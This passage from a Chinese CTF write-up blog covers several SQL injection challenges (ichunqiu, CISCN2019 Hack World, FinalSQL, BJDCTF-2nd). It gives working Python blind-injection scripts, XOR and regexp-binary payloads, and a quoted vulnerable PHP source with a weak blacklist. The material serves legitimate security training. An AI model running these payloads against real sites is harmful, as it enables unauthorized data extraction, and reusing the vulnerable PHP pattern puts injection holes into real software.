        d <span class="token operator">=</span> <span class="token string">"1^((select 1,concat('&#123;&#125;~',CAST('0' AS JSON)))&lt;(select * from f1ag_1s_h3r3_hhhhh limit 1))"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>flag<span class="token operator">+</span>j<span class="token punctuation">)</span>
        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"id"</span><span class="token punctuation">:</span>d<span class="token punctuation">&#125;</span>
        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data <span class="token operator">=</span> data<span class="token punctuation">)</span>
        <span class="token keyword">if</span> <span class="token string">'Nu1L'</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span>j<span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span>
            <span class="token keyword">break</span>
    flag <span class="token operator">=</span> flag <span class="token operator">+</span> j</code></pre>

<p>最终可以得到flag</p>
<h3 id="2020ichunqiu新春公益赛—简单的招聘系统"><a href="#2020ichunqiu新春公益赛—简单的招聘系统" class="headerlink" title="2020ichunqiu新春公益赛—简单的招聘系统"></a>2020ichunqiu新春公益赛—简单的招聘系统</h3><p>首先有个登录界面</p>
<p>尝试使用弱密码，<code>1&#39; or 1=1#</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/SQL%E6%B3%A8%E5%85%A5/tuM3g2DS8hEQ1WL.png" alt loading="lazy"></p>
<p>于是可以在登录界面进行布尔盲注</p>
<p>爆库Payload：<code>2&#39; or (select (mid((select database()),&#123;&#125;,1)))=&#39;&#123;&#125;&#39;#</code></p>
<p>爆表Payload：<code>2&#39; or (select (mid((select group_concat(table_name,&#39;&#39;) from information_schema.tables where table_schema=database()),&#123;&#125;,1)))=&#39;&#123;&#125;&#39;#</code></p>
<p>爆列Payload：<code>2&#39; or (select (mid((select group_concat(column_name,&#39;&#39;) from information_schema.columns where table_name=&#39;flag&#39;),&#123;&#125;,1)))=&#39;&#123;&#125;&#39;#</code></p>
<p>爆字段Payload：<code>2&#39; or (select (mid((select group_concat(flaaag,&#39;&#39;) from flag),&#123;&#125;,1)))=&#39;&#123;&#125;&#39;#</code></p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
<span class="token keyword">import</span> string
url <span class="token operator">=</span> <span class="token string">"http://b191000b2d4c4a77ad9c86f2d5476e7172ed2000f40b4c72.changame.ichunqiu.com/"</span>
<span class="token builtin">str</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">"-"</span> <span class="token operator">+</span> string<span class="token punctuation">.</span>digits <span class="token operator">+</span> string<span class="token punctuation">.</span>ascii_letters <span class="token operator">+</span> string<span class="token punctuation">.</span>punctuation<span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"'"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'"'</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"\\"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">)</span>
flag <span class="token operator">=</span> <span class="token string">""</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">str</span><span class="token punctuation">:</span>
        <span class="token comment">#d = "1 and if(ascii(mid(fl4g,1,1))regexp "+str(j)+",sleep(3),1)"</span>
        d <span class="token operator">=</span> <span class="token string">"(This is Payload)"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>j<span class="token punctuation">)</span>
        <span class="token comment">#print(d)</span>
        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"lname"</span><span class="token punctuation">:</span>d <span class="token punctuation">,</span> <span class="token string">"lpass"</span><span class="token punctuation">:</span><span class="token string">'xxx'</span><span class="token punctuation">&#125;</span>
        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data <span class="token operator">=</span> data<span class="token punctuation">)</span>
        r<span class="token punctuation">.</span>encoding <span class="token operator">=</span> <span class="token string">'gbk'</span>
        <span class="token keyword">if</span> <span class="token string">'成功'</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'gbk'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span>r<span class="token punctuation">.</span>apparent_encoding<span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span>j<span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span>
            <span class="token keyword">break</span></code></pre>

<p>得到数据库：<code>nzhaopin</code>,表：<code>backup,flag,user</code>，flag表的内容：<code>id,flaaag</code>，最终得到flag</p>
<h3 id="CISCN2019-Web1—Hack-World"><a href="#CISCN2019-Web1—Hack-World" class="headerlink" title="CISCN2019-Web1—Hack World"></a>CISCN2019-Web1—Hack World</h3><p><strong>解题核心</strong>—————–异或注入，盲注爆破</p>
<p>界面：</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/SQL%E6%B3%A8%E5%85%A5/t2nS8YpRmGTEsx7.png" alt loading="lazy"></p>
<p>题目给出了flag在flag表和flag列中</p>
<p>测试后发现过滤了大多数字符，但有些还是没过滤的，于是进行sql盲注</p>
<p>空格利用<code>()</code>绕过，配合异或注入和判断回显信息一个一个爆出字符串</p>
<p>python脚本：</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
url <span class="token operator">=</span> <span class="token string">"http://13b50f67-3a54-481d-ae76-97f425fd8855.node3.buuoj.cn/"</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        d <span class="token operator">=</span> <span class="token string">"1^(ascii(substr((select(flag)from(flag)),&#123;&#125;,1))=&#123;&#125;)"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>j<span class="token punctuation">)</span>
        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"id"</span><span class="token punctuation">:</span>d<span class="token punctuation">&#125;</span>
        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data <span class="token operator">=</span> data<span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>status_code<span class="token punctuation">)</span>
        <span class="token keyword">if</span> <span class="token string">'Error'</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span></code></pre>

<p>网上这题的源码，可以参考参考</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token variable">$dbuser</span><span class="token operator">=</span><span class="token string single-quoted-string">'root'</span><span class="token punctuation">;</span>
<span class="token variable">$dbpass</span><span class="token operator">=</span><span class="token string single-quoted-string">'root'</span><span class="token punctuation">;</span>

<span class="token keyword">function</span> <span class="token function-definition function">safe</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token comment">#被过滤的内容 函数基本没过滤</span>
    <span class="token variable">$blackList</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">' '</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'||'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'#'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'-'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">';'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'&amp;'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'+'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'or'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'and'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'`'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'"'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'insert'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'group'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'limit'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'update'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'delete'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'*'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'into'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'union'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'load_file'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'outfile'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'./'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$blackList</span> <span class="token keyword">as</span> <span class="token variable">$blackitem</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">stripos</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">,</span><span class="token variable">$blackitem</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token keyword">return</span> <span class="token constant boolean">False</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">return</span> <span class="token constant boolean">True</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token variable">$db</span> <span class="token operator">=</span> <span class="token function">mysql_connect</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"localhost"</span><span class="token punctuation">,</span><span class="token variable">$dbuser</span><span class="token punctuation">,</span><span class="token variable">$dbpass</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$db</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">mysql_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>   
<span class="token function">mysql_select_db</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"ctf"</span><span class="token punctuation">,</span><span class="token variable">$db</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">safe</span><span class="token punctuation">(</span><span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token variable">$query</span> <span class="token operator">=</span> <span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"SELECT content from passage WHERE id = $&#123;id&#125; limit 0,1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysql_fetch_array</span><span class="token punctuation">(</span><span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token keyword">echo</span> <span class="token variable">$result</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Error Occured When Fetch Result."</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
        <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"SQL Injection Checked."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></span></code></pre>

<h3 id="极客大挑战—FinalSQL"><a href="#极客大挑战—FinalSQL" class="headerlink" title="极客大挑战—FinalSQL"></a>极客大挑战—FinalSQL</h3><p><strong>解题核心</strong>—————–异或注入，盲注爆破</p>
<p>在用户名和密码密码处尝试注入，发现绝大多数的字符都被过滤，于是找到另一个注入点（如下图），把注释删掉后在界面传参回车后观察URL的变化，传了一个id参数，故尝试在URL中的id处注入</p>
<img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/SQL注入/MK1eADvmQB6dsRu.png" style="zoom: 80%;" loading="lazy">

<p>后台过滤到限制字符的显示的界面（如下图）</p>
<img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/SQL注入/R4IgVByGQD1h6Pk.png" style="zoom:33%;" loading="lazy">

<p>当注入上一题的查询数据库语句时，发现可以注入，显示以下界面，应该是后台把报错的界面给处理了，所以看不到数据库报错的界面</p>
<img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/SQL注入/yjbmJD4Ocn76fCA.png" style="zoom:33%;" loading="lazy">

<p>进行异或注入测试，通过测试发现，id=1^1的结果和id=0的结果是一样的，当id=1^0的时候，界面就返回了当id=1的时候的界面，由此可以想到通过构造ASCII函数配合substr函数判断字符大小，当ASCII函数值等于（居然没过滤）后面的十进制时，显示id=0的时候的界面，具体脚本和判断方法如下：</p>
<pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span><span class="token operator">^</span><span class="token punctuation">(</span>ascii<span class="token punctuation">(</span>substr<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">"此处为sql语句"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>变量i<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">=</span>变量j<span class="token punctuation">)</span></code></pre>

<p>查库：</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
url <span class="token operator">=</span> <span class="token string">"http://8a4e2d60-6624-4865-b943-aa15ea964e76.node3.buuoj.cn/search.php"</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        d <span class="token operator">=</span> <span class="token string">"?id=1^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where((table_schema)like'geek')),'"</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"',1))='"</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"')"</span>
        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">+</span>d<span class="token punctuation">)</span>
        <span class="token keyword">if</span> <span class="token string">'ERROR'</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span></code></pre>

<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/SQL%E6%B3%A8%E5%85%A5/31rlIa5vfeoYkNF.png" alt loading="lazy"></p>
<p>查表：</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
url <span class="token operator">=</span> <span class="token string">"http://8a4e2d60-6624-4865-b943-aa15ea964e76.node3.buuoj.cn/search.php"</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        d <span class="token operator">=</span> <span class="token string">"?id=1^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where((table_schema)='geek')),'"</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"',1))='"</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"')"</span>
        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">+</span>d<span class="token punctuation">)</span>
        <span class="token keyword">if</span> <span class="token string">'ERROR'</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span></code></pre>

<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/SQL%E6%B3%A8%E5%85%A5/iOdeEnDWUwNK8V3.png" alt loading="lazy"></p>
<p>查列：</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
url <span class="token operator">=</span> <span class="token string">"http://8a4e2d60-6624-4865-b943-aa15ea964e76.node3.buuoj.cn/search.php"</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        d <span class="token operator">=</span> <span class="token string">"?id=1^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where((table_name)='F1naI1y')),'"</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"',1))='"</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"')"</span>
        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">+</span>d<span class="token punctuation">)</span>
        <span class="token keyword">if</span> <span class="token string">'ERROR'</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span></code></pre>

<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/SQL%E6%B3%A8%E5%85%A5/DTSb4nMyjg6e89R.png" alt loading="lazy"></p>
<p>emmmmmmm这里长度没给够，根据前面的经验，查password列应该就可以了，F1aaaaag表中没有东西</p>
<p>查字段：</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
url <span class="token operator">=</span> <span class="token string">"http://8a4e2d60-6624-4865-b943-aa15ea964e76.node3.buuoj.cn/search.php"</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">300</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        d <span class="token operator">=</span> <span class="token string">"?id=1^(ascii(substr((select(group_concat(password))from(F1naI1y)),'"</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"',1))='"</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"')"</span>
        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">+</span>d<span class="token punctuation">)</span>
        <span class="token keyword">if</span> <span class="token string">'ERROR'</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span></code></pre>

<p>拿到flag：</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/SQL%E6%B3%A8%E5%85%A5/RvGOsyKqSXYNEug.png" alt loading="lazy"></p>
<h3 id="BJDCTF-2nd—简单注入"><a href="#BJDCTF-2nd—简单注入" class="headerlink" title="BJDCTF-2nd—简单注入"></a>BJDCTF-2nd—简单注入</h3><p><strong>解题核心</strong>—————–regexp()正则匹配，binary大小写匹配，布尔盲注(亦可时间盲注)</p>
<p>参考：<a href="https://www.gem-love.com/ctf/2097.html#GirlfriendInjection">https://www.gem-love.com/ctf/2097.html#GirlfriendInjection</a></p>
<img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/SQL注入/rODhM3lG8ux9Hdf.png" style="zoom:80%;" loading="lazy">

<p>这题看着界面有点眼熟，这这个网站上有个类似的题<a href="http://pcat.cc/q.php">http://pcat.cc/q.php</a> ，Question 5那一期的web题</p>
<p>先fuzz一下，以下字符被过滤：</p>
<img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/SQL注入/FnfpO9AMlex8UdC.png" style="zoom: 80%;" loading="lazy">

<p>几个常用的注入参数被过滤：<code>&#39; &quot; select</code>，这几个参数被过滤就已经杀了大部分的可注入方式，于是想办法构造注入条件，题目解题思路和Question 5那一期的web题类似，直接给出解题方法</p>
<p>解题方法：在用户名处注入反斜杆<code>\</code>，可以将后端<code>sql</code>语句处<code>username</code>的后面的单引号转义</p>
<p>推测后端sql语句变成</p>
<pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> username password <span class="token keyword">from</span> users <span class="token keyword">where</span> username <span class="token operator">=</span> <span class="token string">'1\' and password = '</span> <span class="token operator">or</span> <span class="token number">1</span><span class="token comment">#'</span></code></pre>

<p>测试后发题目下方的字符串改变了（可惜比赛的时候没注意），可以用regexp正则模糊匹配的方法构造sql注入语句注出<code>admin</code>的<code>password</code>，于是写<code>python</code>脚本盲注</p>
<img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/SQL注入/Vc2DsFmxGRngN4p.png" style="zoom: 80%;" loading="lazy">

<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
url <span class="token operator">=</span> <span class="token string">"http://507fd7ed-7cc8-42d3-86ad-6b5ec032b815.node3.buuoj.cn/index.php"</span>
header <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
    <span class="token string">"User-Agent"</span><span class="token punctuation">:</span> <span class="token string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0"</span><span class="token punctuation">,</span>
    <span class="token string">"Accept"</span><span class="token punctuation">:</span> <span class="token string">"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"</span><span class="token punctuation">,</span>
    <span class="token string">"Content-Type"</span><span class="token punctuation">:</span> <span class="token string">"application/x-www-form-urlencoded"</span>
<span class="token punctuation">&#125;</span>
str1 <span class="token operator">=</span> <span class="token string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'</span>
passwd <span class="token operator">=</span> <span class="token string">''</span>
pass1 <span class="token operator">=</span> <span class="token string">''</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> j <span class="token keyword">in</span> str1<span class="token punctuation">:</span>
        pass1 <span class="token operator">=</span> <span class="token string">'0x5E'</span> <span class="token operator">+</span> passwd<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'0x5E'</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'0x'</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">)</span>
        payload <span class="token operator">=</span> <span class="token string">' or password regexp binary &#123;&#125;#'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>pass1<span class="token punctuation">)</span>
        <span class="token comment">#print(pass1)</span>
        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
            <span class="token string">'username'</span><span class="token punctuation">:</span> <span class="token string">'1\\'</span><span class="token punctuation">,</span>
            <span class="token string">'password'</span><span class="token punctuation">:</span> payload
        <span class="token punctuation">&#125;</span>
        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">,</span>headers<span class="token operator">=</span>header<span class="token punctuation">)</span>
        <span class="token keyword">if</span> <span class="token string">'BJD needs'</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
            passwd <span class="token operator">=</span> passwd <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'0x'</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">)</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span>j<span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span>
            <span class="token keyword">break</span></code></pre>

<p>注意这里<code>binary</code>的使用，比赛的时候就是被这里给坑了=.=，mysql默认不区分大小写，这里使用该关键字来区分大小写，还有<code>regexp</code>函数可以匹配十六进制数，涨姿势了，这样就可以绕过引号的过滤，另外上面的<code>Ezsqli</code>题也还有一种匹配大小写的方法，用于<code>in</code>被过滤，<code>binary</code>就不好使了</p>
<p>最后盲注出<code>password</code>为<code>OhyOuFOuNdit</code>登录<code>admin</code>账号即可得到<code>flag</code></p>
<p>另外还有一种时间盲注的方法： <code>or if(substr(password,1,1)regexp binary 0x5E...,sleep(3),1)</code></p>
<h3 id="CTFshow—web1"><a href="#CTFshow—web1" class="headerlink" title="CTFshow—web1"></a>CTFshow—web1</h3><p>访问<code>www.zip</code>得到源码</p>
